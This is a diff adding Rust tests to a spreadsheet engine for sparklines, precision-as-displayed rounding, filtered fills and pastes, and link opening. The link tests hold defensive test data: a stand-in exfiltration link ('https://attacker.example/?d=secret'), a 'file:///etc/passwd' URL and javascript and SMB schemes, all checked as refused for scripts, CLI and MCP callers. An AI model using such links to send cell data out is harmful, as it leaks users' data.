+    assert_eq!(r["output"], "B9:C9");
+}
+
+#[test]
+fn analysis_overwrite_keeps_the_target_cell_style() {
+    let mut s = s();
+    quick_analysis_block(&mut s);
+    s.execute("cell.set", json!({"cell": "B5", "input": "1"})).unwrap();
+    s.execute("selection.set", json!({"cell": "B5"})).unwrap();
+    s.execute("home.bold", json!({})).unwrap();
+    s.execute("analysis.addTotal", json!({"range": "A1:C4", "overwrite": true})).unwrap();
+    assert_eq!(v(&s, "B5"), Value::Number(6.0));
+    let d = s.doc().unwrap();
+    let sh = d.wb.active().unwrap();
+    assert!(d.wb.styles.get(sh.style_id(CellRef::parse("B5").unwrap())).font.bold, "bold survives the overwrite");
+}
+
+#[test]
+fn analysis_commands_refuse_a_multi_area_selection_without_a_range() {
+    let mut s = s();
+    quick_analysis_block(&mut s);
+    s.execute("selection.set", json!({"range": "A1:C4,E1:F4"})).unwrap();
+    for c in ["analysis.addTotal", "analysis.addSparklines"] {
+        let e = s.execute(c, json!({})).unwrap_err().to_string();
+        assert!(e.contains("single contiguous range"), "{c}: {e}");
+    }
+    assert_eq!(v(&s, "B5"), Value::Empty);
+    // An explicit range still works.
+    s.execute("analysis.addTotal", json!({"range": "A1:C4"})).unwrap();
+    assert_eq!(v(&s, "B5"), Value::Number(6.0));
+}
+
+#[test]
+fn analysis_add_sparklines_one_per_row_in_one_undo_step() {
+    let mut s = s();
+    quick_analysis_block(&mut s);
+    let before = s.doc().unwrap().undo.len();
+    let r = s.execute("analysis.addSparklines", json!({"range": "A1:C4", "type": "column"})).unwrap();
+    assert_eq!(r["output"], "D2:D4", "header row and label column are skipped");
+    let sparks = s.doc().unwrap().wb.active().unwrap().sparklines.clone();
+    assert_eq!(sparks.len(), 3);
+    assert!(sparks.iter().any(|x| x.cell == CellRef::parse("D3").unwrap() && x.source == "B3:C3"));
+    assert_eq!(s.doc().unwrap().undo.len(), before + 1);
+    s.execute("edit.undo", json!({})).unwrap();
+    assert!(s.doc().unwrap().wb.active().unwrap().sparklines.is_empty());
+    assert!(s.execute("analysis.addSparklines", json!({"range": "A1:A4"})).is_err());
+}
+
+#[test]
+fn analysis_add_sparklines_refuses_a_protected_sheet() {
+    let mut s = s();
+    quick_analysis_block(&mut s);
+    s.execute("analysis.addSparklines", json!({"range": "A1:C4"})).unwrap();
+    s.execute("review.protectSheet", json!({})).unwrap();
+    let (undo, sparks) = (s.doc().unwrap().undo.len(), s.doc().unwrap().wb.active().unwrap().sparklines.clone());
+    for p in [json!({"range": "A1:C4", "overwrite": true}), json!({"range": "A1:B3", "direction": "columns"})] {
+        assert!(s.execute("analysis.addSparklines", p).is_err());
+    }
+    assert_eq!(s.doc().unwrap().undo.len(), undo, "a refused command leaves no undo step");
+    assert_eq!(s.doc().unwrap().wb.active().unwrap().sparklines, sparks);
+    s.execute("review.unprotectSheet", json!({})).unwrap();
+    s.execute("analysis.addSparklines", json!({"range": "A1:C4", "overwrite": true})).unwrap();
+}
+
 #[test]
 fn link_open_refuses_every_scheme_but_http_https_and_mailto() {
     let mut s = s();
@@ -4549,10 +5525,55 @@ fn link_open_refuses_every_scheme_but_http_https_and_mailto() {
     }
     assert!(s.execute("link.open", json!({"cell": "A1"})).is_err());
     assert!(s.take_ui_requests().is_empty());
+    // A host's `Allow` policy opens web and e-mail addresses directly, and nothing else.
+    s.link_policy = crate::links::LinkPolicy::Allow;
+    for url in ["file:///etc/passwd", "smb://h/s", "\\\\h\\s", "JAVASCRIPT:1"] {
+        assert!(s.execute("link.open", json!({"url": url})).is_err(), "{url}");
+    }
+    assert!(s.take_ui_requests().is_empty());
     s.execute("link.open", json!({"url": "HTTPS://example.org/a"})).unwrap();
     assert_eq!(s.take_ui_requests(), vec![crate::UiRequest::OpenUrl("HTTPS://example.org/a".into())]);
     s.execute("link.open", json!({"url": "B2"})).unwrap();
     assert!(s.take_ui_requests().is_empty());
+}
+
+/// #2181: `link.open` is reachable by the control channel, CLI, MCP and scripts, so by default it
+/// opens no web or e-mail address (an exfiltration channel: `https://attacker/?d=<cell data>`)
+/// and asks for no dialog either; only the host's confirmed path opens one.
+#[test]
+fn programmatic_link_open_never_opens_an_external_address_without_confirmation() {
+    let mut s = s();
+    assert_eq!(s.link_policy, crate::links::LinkPolicy::Confirm, "confirmation is the default");
+    s.execute("cell.set", json!({"cell": "A1", "input": "secret"})).unwrap();
+    s.execute("insert.link", json!({"cell": "B1", "target": "https://attacker.example/?d=secret"})).unwrap();
+    s.execute("insert.link", json!({"cell": "C1", "target": "mailto:x@attacker.example"})).unwrap();
+    s.take_ui_requests();
+    for p in [
+        json!({"url": "https://attacker.example/?d=secret"}),
+        json!({"url": "http://attacker.example"}),
+        json!({"target": "MAILTO:x@attacker.example"}),
+        json!({"cell": "B1"}),
+        json!({"cell": "C1"}),
+    ] {
+        let e = s.execute("link.open", p.clone()).unwrap_err().to_string();
+        assert!(e.contains(crate::links::NEEDS_CONFIRMATION), "{p}: {e}");
+    }
+    assert!(s.take_ui_requests().is_empty(), "no OpenUrl and no dialog for a programmatic caller");
+    assert!(s.execute_headless("link.open", json!({"cell": "B1"})).is_err());
+    assert!(s.take_ui_requests().is_empty());
+    // References still navigate.
+    s.execute("link.open", json!({"url": "A1"})).unwrap();
+    assert!(s.take_ui_requests().is_empty());
+
+    // The host's confirmed path opens the allowed address, and still refuses every other scheme.
+    assert_eq!(s.open_confirmed_link(" https://example.org/a ").unwrap(), json!({"opened": "https://example.org/a"}));
+    assert_eq!(s.take_ui_requests(), vec![crate::UiRequest::OpenUrl("https://example.org/a".into())]);
+    for url in ["file:///etc/passwd", "\\\\h\\s", "javascript:1", "x-custom://a", "\u{1}https://a.example"] {
+        assert!(s.open_confirmed_link(url).is_err(), "{url:?}");
+    }
+    assert!(s.take_ui_requests().is_empty());
+    s.open_confirmed_link("Sheet1!C3").unwrap();
+    assert_eq!(s.doc().unwrap().selection.active, CellRef::new(2, 2));
 }
 
 #[test]
@@ -4598,6 +5619,470 @@ fn paste_special_validation_moves_relative_references() {
     s.execute("edit.pasteSpecial", json!({"what": "validation", "at": "C3"})).unwrap();
     assert!(!ok(&mut s, "C3", "5"), "the pasted rule checks C3, not A1");
     assert!(ok(&mut s, "C3", "20"));
+}
+
+/// "Set precision as displayed" (formulas.calculationOptions `precisionAsDisplayed`). Behaviour
+/// observed in Excel through COM with synthetic values: turning it on rounds existing constants
+/// and formulas to their formats; constants typed or reformatted while it is on are rounded at
+/// once (permanently: a wider format later doesn't bring digits back); General keeps full
+/// precision; turning it off restores formulas on recalculation, not constants.
+#[test]
+fn precision_as_displayed_option() {
+    let mut s = s();
+    let num = |s: &Session, a: &str| v(s, a).as_f64().unwrap_or(f64::NAN);
+    s.execute("cell.set", json!({"cell": "A1", "input": "1.23456"})).unwrap();
+    s.execute("cell.set", json!({"cell": "A2", "input": "=A1*100"})).unwrap();
+    s.execute("cell.set", json!({"cell": "A3", "input": "=7/3"})).unwrap();
+    s.execute("cell.set", json!({"cell": "A4", "input": "0.333333333333333"})).unwrap();
+    s.execute("home.numberFormat", json!({"range": "A1", "code": "0.00"})).unwrap();
+    s.execute("home.numberFormat", json!({"range": "A3", "code": "0"})).unwrap();
+    assert_eq!((num(&s, "A1"), num(&s, "A3")), (1.23456, 7.0 / 3.0));
+    let r = s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": true})).unwrap();
+    assert_eq!(r["precisionAsDisplayed"], true);
+    assert_eq!((num(&s, "A1"), num(&s, "A2"), num(&s, "A3"), num(&s, "A4")), (1.23, 123.0, 2.0, 0.333333333333333));
+    let r = s.execute("file.options", json!({})).unwrap();
+    assert_eq!(r["calculation"]["precisionAsDisplayed"], true);
+    // Typed while on: rounded to the cell's format, and dependents read the rounded value.
+    s.execute("cell.set", json!({"cell": "A1", "input": "4.56789"})).unwrap();
+    assert_eq!((num(&s, "A1"), num(&s, "A2")), (4.57, 457.0));
+    s.execute("range.setValues", json!({"range": "A1", "values": [[5.43219]]})).unwrap();
+    assert_eq!(num(&s, "A1"), 5.43);
+    // Reformatting while on rounds a constant and a formula at once.
+    s.execute("cell.set", json!({"cell": "B1", "input": "1.23456"})).unwrap();
+    s.execute("cell.set", json!({"cell": "B2", "input": "=1.23456"})).unwrap();
+    s.execute("cell.set", json!({"cell": "B3", "input": "=B1*100"})).unwrap();
+    assert_eq!(num(&s, "B1"), 1.23456);
+    s.execute("home.numberFormat", json!({"range": "B1:B2", "code": "0.0"})).unwrap();
+    assert_eq!((num(&s, "B1"), num(&s, "B2"), num(&s, "B3")), (1.2, 1.2, 120.0));
+    // The constant's digits are gone for good; the formula is rounded again from its result.
+    s.execute("home.numberFormat", json!({"range": "B1:B2", "code": "0.0000"})).unwrap();
+    assert_eq!((num(&s, "B1"), num(&s, "B2")), (1.2, 1.2346));
+    // Undo brings the unrounded constant back.
+    s.execute("edit.undo", json!({})).unwrap();
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_eq!(num(&s, "B1"), 1.23456);
+    // Saved with the workbook, and applied on recalculation after reopening.
+    reopen(&mut s);
+    assert!(s.doc().unwrap().wb.calc.precision_as_displayed);
+    assert_eq!(num(&s, "A3"), 2.0);
+    // Off: formulas get their full precision back, constants stay rounded.
+    s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": false})).unwrap();
+    assert_eq!((num(&s, "A1"), num(&s, "A3")), (5.43, 7.0 / 3.0));
+}
+
+/// Reformatting a cell a dynamic array spills into rounds that element as displayed: the cell
+/// holds no stored value (the spill lives in `Sheet::spill`), so the edit changes only its
+/// style, and the anchor must be recalculated for the element to be rounded.
+#[test]
+fn precision_as_displayed_rounds_a_reformatted_spill_cell() {
+    let mut s = s();
+    let num = |s: &Session, a: &str| v(s, a).as_f64().unwrap_or(f64::NAN);
+    s.execute("cell.set", json!({"cell": "F1", "input": "=SEQUENCE(3,1,0.123,0.111)"})).unwrap();
+    s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": true})).unwrap();
+    s.execute("cell.set", json!({"cell": "G1", "input": "=SUM(F1:F3)"})).unwrap();
+    let (f2, f3) = (0.123 + 0.111, 0.123 + 0.111 * 2.0);
+    assert_eq!((num(&s, "F1"), num(&s, "F2"), num(&s, "F3")), (0.123, f2, f3));
+    // Formatting a spill destination (the anchor is not in the edit) rounds just that element.
+    s.execute("home.numberFormat", json!({"range": "F2", "code": "0.0"})).unwrap();
+    assert_eq!((num(&s, "F1"), num(&s, "F2"), num(&s, "F3")), (0.123, 0.2, f3));
+    assert_eq!(num(&s, "G1"), 0.123 + 0.2 + f3);
+    // A range covering anchor and spill, and a whole column, round every element.
+    s.execute("home.numberFormat", json!({"range": "F:F", "code": "0.00"})).unwrap();
+    assert_eq!((num(&s, "F1"), num(&s, "F2"), num(&s, "F3")), (0.12, 0.23, 0.35));
+    assert_eq!(num(&s, "G1"), 0.12 + 0.23 + 0.35);
+    // Formatting a cell that no spill covers changes nothing.
+    s.execute("home.numberFormat", json!({"range": "F4", "code": "0.0"})).unwrap();
+    assert_eq!(num(&s, "F3"), 0.35);
+}
+#[test]
+fn precision_as_displayed_enable_undoes_in_one_step() {
+    let mut s = s();
+    let num = |s: &Session, a: &str| v(s, a).as_f64().unwrap_or(f64::NAN);
+    s.execute("cell.set", json!({"cell": "A1", "input": "1.23456"})).unwrap();
+    s.execute("cell.set", json!({"cell": "A2", "input": "=A1*100"})).unwrap();
+    s.execute("home.numberFormat", json!({"range": "A1", "code": "0.00"})).unwrap();
+    s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": true})).unwrap();
+    assert_eq!((num(&s, "A1"), num(&s, "A2")), (1.23, 123.0));
+    // One undo brings back the constants and the flag together.
+    s.execute("edit.undo", json!({})).unwrap();
+    assert!(!s.doc().unwrap().wb.calc.precision_as_displayed);
+    assert_eq!((num(&s, "A1"), num(&s, "A2")), (1.23456, 1.23456 * 100.0));
+}
+
+#[test]
+fn precision_as_displayed_applies_in_manual_mode() {
+    let mut s = s();
+    let num = |s: &Session, a: &str| v(s, a).as_f64().unwrap_or(f64::NAN);
+    s.execute("cell.set", json!({"cell": "A1", "input": "1.23456"})).unwrap();
+    s.execute("cell.set", json!({"cell": "A2", "input": "=A1*100"})).unwrap();
+    s.execute("home.numberFormat", json!({"range": "A1", "code": "0.00"})).unwrap();
+    s.execute("formulas.calculationOptions", json!({"mode": "manual"})).unwrap();
+    // Turning it on rounds the values at once, without a calculation.
+    s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": true})).unwrap();
+    assert_eq!((num(&s, "A1"), num(&s, "A2")), (1.23, 123.0));
+    // Turning it off recalculates at once too: the formula reads the rounded constant.
+    s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": false})).unwrap();
+    assert_eq!((num(&s, "A1"), num(&s, "A2")), (1.23, 1.23 * 100.0));
+}
+
+#[test]
+fn precision_as_displayed_on_a_protected_sheet_keeps_locked_constants() {
+    let mut s = s();
+    let num = |s: &Session, a: &str| v(s, a).as_f64().unwrap_or(f64::NAN);
+    s.execute("cell.set", json!({"cell": "A1", "input": "1.23456"})).unwrap();
+    s.execute("cell.set", json!({"cell": "A2", "input": "=A1*100"})).unwrap();
+    s.execute("cell.set", json!({"cell": "B1", "input": "1.23456"})).unwrap();
+    s.execute("home.numberFormat", json!({"range": "A1:B1", "code": "0.00"})).unwrap();
+    s.execute("home.lockCell", json!({"range": "B1", "on": false})).unwrap();
+    s.execute("review.protectSheet", json!({})).unwrap();
+    // Turning the option on is not refused: the locked constant keeps its digits, the unlocked
+    // one is rounded.
+    s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": true})).unwrap();
+    assert!(s.doc().unwrap().wb.calc.precision_as_displayed);
+    assert_eq!((num(&s, "A1"), num(&s, "B1"), num(&s, "A2")), (1.23456, 1.23, 1.23456 * 100.0));
+    // Reformatting a locked constant, on a sheet that allows formatting, keeps its digits too.
+    s.execute("review.unprotectSheet", json!({})).unwrap();
+    s.execute("review.protectSheet", json!({"formatCells": true})).unwrap();
+    s.execute("home.numberFormat", json!({"range": "A1", "code": "0.0"})).unwrap();
+    assert_eq!(num(&s, "A1"), 1.23456);
+}
+
+#[test]
+fn precision_as_displayed_rounds_a_legacy_array_by_each_cell() {
+    let mut s = s();
+    let num = |s: &Session, a: &str| v(s, a).as_f64().unwrap_or(f64::NAN);
+    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [2]]})).unwrap();
+    s.execute("home.numberFormat", json!({"range": "B1", "code": "0.00"})).unwrap();
+    s.execute("home.numberFormat", json!({"range": "B2", "code": "0.0"})).unwrap();
+    s.execute("selection.set", json!({"range": "B1:B2"})).unwrap();
+    s.execute("cell.set", json!({"input": "=A1:A2/3", "array": true})).unwrap();
+    assert_eq!((num(&s, "B1"), num(&s, "B2")), (1.0 / 3.0, 2.0 / 3.0));
+    // Each element takes the format of the cell it lands in.
+    s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": true})).unwrap();
+    assert_eq!((num(&s, "B1"), num(&s, "B2")), (0.33, 0.7));
+}
+
+#[test]
+fn precision_as_displayed_rounds_numbers_written_to_a_new_sheet() {
+    let mut s = s();
+    s.execute("range.setValues", json!({"range": "A1", "values": [[1], [2], [4], [7], [3], [5]]})).unwrap();
+    // Histogram output on a new sheet, with the option off, keeps full precision.
+    s.execute("data.analysisToolPak", json!({"tool": "histogram", "range": "Sheet1!A1:A6", "cumulative": true, "newSheet": "Raw"})).unwrap();
+    let raw: Vec<(CellRef, f64)> = {
+        let d = s.doc().unwrap();
+        let sh = d.wb.sheet(d.wb.sheet_index("Raw").unwrap()).unwrap();
+        sh.cells
+            .iter()
+            .filter_map(|(c, cell)| match cell.value {
+                Value::Number(n) if cell.formula.is_none() => Some((c, n)),
+                _ => None,
+            })
+            .collect()
+    };
+    s.execute("formulas.calculationOptions", json!({"precisionAsDisplayed": true})).unwrap();
+    s.execute("data.analysisToolPak", json!({"tool": "histogram", "range": "Sheet1!A1:A6", "cumulative": true, "newSheet": "Rounded"})).unwrap();
+    let d = s.doc().unwrap();
+    let si = d.wb.sheet_index("Rounded").unwrap();
+    let sh = d.wb.sheet(si).unwrap();
+    let mut prec = gridcraft_calc::DisplayedPrecision::new();
+    let mut rounded = 0;
+    for (c, n) in &raw {
+        let want = prec.round(&d.wb, si, *c, *n);
+        assert_eq!(sh.value(*c), Value::Number(want), "{c:?}");
+        rounded += usize::from(want != *n);
+    }
+    // Cumulative shares of six values are sixths, which the percent format rounds.
+    assert!(rounded > 0, "the histogram's formatted cells should be rounded");
+}
+
+/// #1101: repeating one cell or row down a filtered selection (paste, Ctrl+Enter, Fill Down) skips
+/// the rows the filter hides, as in Excel. A taller pasted block goes straight down, and rows
+/// hidden by hand are written, also as in Excel (each case measured in Excel for Microsoft 365).
+#[test]
+fn fills_and_single_row_pastes_skip_filtered_rows() {
+    let fresh = s;
+    let filtered = || {
+        let mut s = fresh();
+        let mut rows = vec![json!(["Val", "Tag"])];
+        for i in 2..=11 {
+            rows.push(json!([format!("v{i}"), if [3, 5, 7, 9].contains(&i) { "hide" } else { "keep" }]));
+        }
+        s.execute("range.setValues", json!({"range": "A1", "values": rows})).unwrap();
+        s.execute("range.setValues", json!({"range": "E1", "values": [["X", "W"], ["Y", ""]]})).unwrap();
+        s.execute("selection.set", json!({"range": "A1:B1"})).unwrap();
+        s.execute("data.filter", json!({})).unwrap();
+        assert_eq!(s.execute("data.filterBy", json!({"column": "B", "values": ["keep"]})).unwrap()["hiddenRows"], 4);
+        s
+    };
+    let col = |s: &Session, c: &str| -> Vec<Value> { (2..=11).map(|r| v(s, &format!("{c}{r}"))).collect() };
+    let skipped =
+        |x: &str| -> Vec<Value> { (2..=11).map(|r| Value::from(if [3, 5, 7, 9].contains(&r) { format!("v{r}") } else { x.to_string() })).collect() };
+
+    // One cell pasted over the filtered rows.
+    let mut s = filtered();
+    s.execute("edit.copy", json!({"range": "E1"})).unwrap();
+    s.execute("selection.set", json!({"range": "A2:A11"})).unwrap();
+    s.execute("edit.paste", json!({})).unwrap();
+    assert_eq!(col(&s, "A"), skipped("X"));
+
+    // One row (two cells) pasted over the filtered rows.
+    let mut s = filtered();
+    s.execute("edit.copy", json!({"range": "E1:F1"})).unwrap();
+    s.execute("selection.set", json!({"range": "A2:B11"})).unwrap();
+    s.execute("edit.paste", json!({})).unwrap();
+    assert_eq!(col(&s, "A"), skipped("X"));
+    assert_eq!(v(&s, "B3"), Value::from("hide"));
+    assert_eq!(v(&s, "B4"), Value::from("W"));
+
+    // A two-row block is pasted straight down, hidden rows included.
+    let mut s = filtered();
+    s.execute("edit.copy", json!({"range": "E1:E2"})).unwrap();
+    s.execute("selection.set", json!({"range": "A2:A11"})).unwrap();
+    s.execute("edit.paste", json!({})).unwrap();
+    assert_eq!(col(&s, "A"), ["X", "Y", "X", "Y", "X", "Y", "X", "Y", "X", "Y"].map(Value::from));
+
+    // Ctrl+Enter.
+    let mut s = filtered();
+    s.execute("selection.set", json!({"range": "A2:A11"})).unwrap();
+    s.execute("range.fill", json!({"input": "Z"})).unwrap();
+    assert_eq!(col(&s, "A"), skipped("Z"));
+
+    // Fill Down, and a formula filled down still adjusts to the row it lands in.
+    let mut s = filtered();
+    s.execute("edit.fillDown", json!({"range": "A2:A11"})).unwrap();
+    assert_eq!(col(&s, "A"), skipped("v2"));
+    s.execute("cell.set", json!({"cell": "C2", "input": "=ROW()"})).unwrap();
+    s.execute("edit.fillDown", json!({"range": "C2:C11"})).unwrap();
+    assert_eq!(v(&s, "C4"), Value::Number(4.0));
+    assert!(v(&s, "C3").is_empty());
+
+    // Fill Up and Fill Right skip them too.
+    let mut s = filtered();
+    s.execute("edit.fillUp", json!({"range": "A2:A11"})).unwrap();
+    assert_eq!(col(&s, "A"), skipped("v11"));
+    let mut s = filtered();
+    s.execute("range.setValues", json!({"range": "C2", "values": [["c2"], ["c3"], ["c4"]]})).unwrap();
+    s.execute("edit.fillRight", json!({"range": "A2:C4"})).unwrap();
+    assert_eq!([v(&s, "C2"), v(&s, "C3"), v(&s, "C4")], [Value::from("v2"), Value::from("c3"), Value::from("v4")]);
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_eq!(v(&s, "C4"), Value::from("c4"));
+
+    // Copying the filtered range takes only the rows showing, formulas as their values; a cut
+    // still moves every row.
+    let mut s = filtered();
+    s.execute("cell.set", json!({"cell": "C2", "input": "=ROW()"})).unwrap();
+    s.execute("edit.fillDown", json!({"range": "C2:C11"})).unwrap();
+    let r = s.execute("edit.copy", json!({"range": "A1:C11"})).unwrap();
+    assert_eq!(
+        r["text"],
+        "Val	Tag	
+v2	keep	2
+v4	keep	4
+v6	keep	6
+v8	keep	8
+v10	keep	10
+v11	keep	11
+"
+    );
+    s.execute("edit.paste", json!({"at": "H20"})).unwrap();
+    let pasted: Vec<Value> = (20..=27).map(|r| v(&s, &format!("H{r}"))).collect();
+    assert_eq!(pasted, ["Val", "v2", "v4", "v6", "v8", "v10", "v11"].map(Value::from).into_iter().chain([Value::Empty]).collect::<Vec<_>>());
+    assert_eq!(v(&s, "J22"), Value::Number(4.0));
+    assert!(s.doc().unwrap().wb.active().unwrap().cell(CellRef::parse("J22").unwrap()).unwrap().formula.is_none());
+    let mut s = filtered();
+    s.execute("edit.cut", json!({"range": "A1:B11"})).unwrap();
+    s.execute("edit.paste", json!({"at": "H20"})).unwrap();
+    assert_eq!(v(&s, "H22"), Value::from("v3"));
+
+    // Rows hidden by hand (no filter) are written, as in Excel.
+    let mut s = fresh();
+    s.execute("range.setValues", json!({"range": "A1", "values": [["a"], ["b"], ["c"]]})).unwrap();
+    s.execute("home.hideRows", json!({"rows": "2:2"})).unwrap();
+    s.execute("selection.set", json!({"range": "A1:A3"})).unwrap();
+    s.execute("range.fill", json!({"input": "Z"})).unwrap();
+    assert_eq!(v(&s, "A2"), Value::from("Z"));
+}
+
+/// A table of ten rows (A1:B11) with a link on every value cell, four of its rows hidden by a
+/// filter (3, 5, 7, 9), and a spare corner at E1 to copy from.
+fn filtered_rows_with_links() -> Session {
+    let mut s = s();
+    let mut rows = vec![json!(["Val", "Tag"])];
+    for i in 2..=11 {
+        rows.push(json!([format!("v{i}"), if [3, 5, 7, 9].contains(&i) { "hide" } else { "keep" }]));
+    }
+    s.execute("range.setValues", json!({"range": "A1", "values": rows})).unwrap();
+    s.execute("range.setValues", json!({"range": "E1", "values": [["X"]]})).unwrap();
+    let sh = std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap();
+    for r in 2..=11u32 {
+        sh.hyperlinks
+            .insert(CellRef::new(r - 1, 0), gridcraft_model::Hyperlink { target: format!("https://example.com/{r}"), tooltip: None, external: true });
+    }
+    s.execute("selection.set", json!({"range": "A1:B1"})).unwrap();
+    s.execute("data.filter", json!({})).unwrap();
+    s.execute("data.filterBy", json!({"column": "B", "values": ["keep"]})).unwrap();
+    s
+}
+
+fn cell_link_target(s: &Session, cell: &str) -> Option<String> {
+    s.doc().unwrap().wb.active().unwrap().hyperlinks.get(&CellRef::parse(cell).unwrap()).map(|h| h.target.clone())
+}
+
+fn cell_validation(s: &Session, cell: &str) -> Option<String> {
+    let c = CellRef::parse(cell).unwrap();
+    s.doc().unwrap().wb.active().unwrap().validations.iter().find(|d| d.ranges.iter().any(|r| r.contains(c))).map(|d| d.f1.clone())
+}
+
+/// Copying a filtered range packs the rows showing into one block; their links and validation
+/// rules travel with them, and those of the hidden rows are left behind.
+#[test]
+fn filtered_copy_pastes_links_and_validation_of_the_rows_showing_only() {
+    let mut s = filtered_rows_with_links();
+    for (cell, source) in [("A3", "\"hidden\""), ("A4", "\"showing\""), ("A9", "\"hidden too\"")] {
+        s.execute("data.validation", json!({"range": cell, "type": "list", "formula1": source})).unwrap();
+    }
+    s.execute("edit.copy", json!({"range": "A1:B11"})).unwrap();
+    s.execute("edit.paste", json!({"at": "H20"})).unwrap();
+    let links: Vec<Option<String>> = (20..=26).map(|r| cell_link_target(&s, &format!("H{r}"))).collect();
+    let expected: Vec<Option<String>> =
+        [None, Some(2u32), Some(4), Some(6), Some(8), Some(10), Some(11)].iter().map(|n| n.map(|n| format!("https://example.com/{n}"))).collect();
+    assert_eq!(links, expected);
+    let rules: Vec<Option<String>> = (20..=26).map(|r| cell_validation(&s, &format!("H{r}"))).collect();
+    assert_eq!(rules, [None, None, Some("\"showing\"".to_string()), None, None, None, None]);
+    // The source keeps its own links and rules where they were.
+    assert_eq!(cell_link_target(&s, "A3").as_deref(), Some("https://example.com/3"));
+    assert_eq!(cell_validation(&s, "A3").as_deref(), Some("\"hidden\""));
+}
+
+/// One cell pasted over a filtered column leaves the rules of the rows the filter hides alone, and
+/// does not give them the copied rule, with or without Skip Blanks.
+#[test]
+fn single_row_paste_over_filtered_rows_leaves_their_validation_alone() {
+    for skip_blanks in [false, true] {
+        let mut s = filtered_rows_with_links();
+        s.execute("data.validation", json!({"range": "E1", "type": "list", "formula1": "\"copied\""})).unwrap();
+        s.execute("data.validation", json!({"range": "A2:A5", "type": "list", "formula1": "\"old\""})).unwrap();
+        s.execute("edit.copy", json!({"range": "E1"})).unwrap();
+        s.execute("selection.set", json!({"range": "A2:A11"})).unwrap();
+        s.execute("edit.pasteSpecial", json!({"what": "all", "skipBlanks": skip_blanks})).unwrap();
+        let rules: Vec<Option<String>> = (2..=11).map(|r| cell_validation(&s, &format!("A{r}"))).collect();
+        let showing = Some("\"copied\"".to_string());
+        let old = Some("\"old\"".to_string());
+        assert_eq!(
+            rules,
+            [showing.clone(), old.clone(), showing.clone(), old, showing.clone(), None, showing.clone(), None, showing.clone(), showing],
+            "skip blanks: {skip_blanks}"
+        );
+    }
+}
+
+/// Insert Copied Cells after a filtered copy of whole rows makes room for the rows copied, not for
+/// the rows that were selected.
+#[test]
+fn insert_copied_cells_after_a_filtered_row_copy_inserts_only_the_rows_showing() {
+    let mut s = filtered_rows_with_links();
+    s.execute("cell.set", json!({"cell": "A30", "input": "below"})).unwrap();
+    s.execute("edit.copy", json!({"range": "1:11"})).unwrap();
+    s.execute("selection.set", json!({"range": "A20"})).unwrap();
+    s.execute("home.insertCopiedCells", json!({})).unwrap();
+    // Seven rows were copied (the header and six rows showing).
+    assert_eq!(v(&s, "A37"), Value::from("below"));
+    assert_eq!(v(&s, "A20"), Value::from("Val"));
+    assert_eq!(v(&s, "A26"), Value::from("v11"));
+    assert_eq!(v(&s, "A27"), Value::Empty);
+}
+
+/// Copying a filtered range with many separate runs of rows showing moves each row's note, link and
+/// merge with it, and leaves the hidden rows' behind.
+#[test]
+fn filtered_copy_with_many_runs_moves_notes_and_merges_with_their_rows() {
+    let mut s = s();
+    let mut rows = vec![json!(["Val", "Tag"])];
+    for i in 2..=2001 {
+        rows.push(json!([format!("v{i}"), if i % 2 == 1 { "hide" } else { "keep" }]));
+    }
+    s.execute("range.setValues", json!({"range": "A1", "values": rows})).unwrap();
+    let sh = std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb).sheet_mut(0).unwrap();
+    for r in 2..=2001u32 {
+        let note = gridcraft_model::Comment {
+            author: "a".into(),
+            text: format!("note {r}"),
+            replies: vec![],
+            threaded: false,
+            resolved: false,
+            visible: false,
+            dates: vec![],
+            note_box: None,
+        };
+        sh.comments.insert(CellRef::new(r - 1, 0), note);
+    }
+    sh.merges.push(gridcraft_core::RangeRef::new(CellRef::new(3, 1), CellRef::new(3, 2)));
+    sh.merges.push(gridcraft_core::RangeRef::new(CellRef::new(2, 1), CellRef::new(2, 2)));
+    s.execute("selection.set", json!({"range": "A1:B1"})).unwrap();
+    s.execute("data.filter", json!({})).unwrap();
+    s.execute("data.filterBy", json!({"column": "B", "values": ["keep"]})).unwrap();
+    s.execute("edit.copy", json!({"range": "A1:C2001"})).unwrap();
+    s.execute("edit.paste", json!({"at": "H1"})).unwrap();
+    let sh = s.doc().unwrap().wb.active().unwrap();
+    let note = |row: u32| sh.comments.get(&CellRef::new(row - 1, 7)).map(|c| c.text.clone());
+    assert_eq!(note(1), None);
+    assert_eq!(note(2).as_deref(), Some("note 2"));
+    assert_eq!(note(3).as_deref(), Some("note 4"));
+    assert_eq!(note(1001).as_deref(), Some("note 2000"));
+    assert_eq!(sh.comments.keys().filter(|c| c.col == 7).count(), 1000);
+    // Only the merge on a row showing (row 4) came along, packed to the row it landed in (row 3).
+    assert!(sh.merges.contains(&gridcraft_core::RangeRef::new(CellRef::new(2, 8), CellRef::new(2, 9))));
+    assert_eq!(sh.merges.iter().filter(|m| m.start.col >= 7).count(), 1);
+}
+
+#[test]
+fn object_move_refuses_to_rotate_ink() {
+    let mut s = s();
+    let id = s.execute("draw.stroke", json!({"points": [[0, 0], [30, 20], [60, 5]]})).unwrap()["shape"].clone();
+    assert!(s.execute("object.move", json!({"kind": "shape", "id": id, "rotation": 45})).is_err());
+    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[0].rotation, 0.0);
+}
+
+#[test]
+fn object_move_rotates_shapes_only() {
+    let mut s = s();
+    let id = s.execute("insert.shape", json!({"kind": "rectangle"})).unwrap()["shape"].clone();
+    s.execute("object.move", json!({"kind": "shape", "id": id, "rotation": -30})).unwrap();
+    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[0].rotation, 330.0);
+    s.execute("edit.undo", json!({})).unwrap();
+    assert_eq!(s.doc().unwrap().wb.active().unwrap().shapes[0].rotation, 0.0);
+    s.execute("selection.set", json!({"range": "A1"})).unwrap();
+    s.execute("cell.set", json!({"cell": "A1", "input": "1"})).unwrap();
+    let chart = s.execute("insert.chart", json!({"type": "column"})).unwrap()["chart"].clone();
+    assert!(s.execute("object.move", json!({"kind": "chart", "id": chart, "rotation": 45})).is_err());
+}
+
+#[test]
